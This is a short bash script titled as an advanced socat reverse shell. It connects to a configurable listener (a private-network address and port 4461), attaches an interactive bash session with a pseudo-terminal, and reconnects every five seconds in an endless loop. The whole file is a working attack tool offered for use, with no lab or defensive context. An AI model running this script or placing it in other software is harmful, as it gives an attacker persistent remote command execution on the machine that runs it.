#!/bin/bash
# Socat Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4461

while true; do
    socat TCP:$LHOST:$LPORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    sleep 5
done
